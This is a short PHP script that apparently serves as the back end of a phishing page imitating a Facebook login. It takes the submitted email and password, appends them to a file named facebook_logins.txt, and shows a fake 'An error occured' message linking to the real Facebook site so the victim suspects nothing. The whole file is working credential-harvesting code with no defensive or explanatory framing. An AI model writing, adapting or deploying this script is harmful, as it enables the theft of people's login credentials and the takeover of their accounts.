<?php
$email = $_POST["email"];
$pass = $_POST["pass"];

$file = "/Library/WebServer/Documents/form/facebook_logins.txt";
$fp = fopen($file, "a");
fwrite($fp, $email);
fwrite($fp, "\r\n");
fwrite($fp, $pass);
fwrite($fp, "\r\n\r\n");
fclose($fp);
echo "An error occured. Please <a href=\"https://www.facebook.com\">try again</a>.";
?>
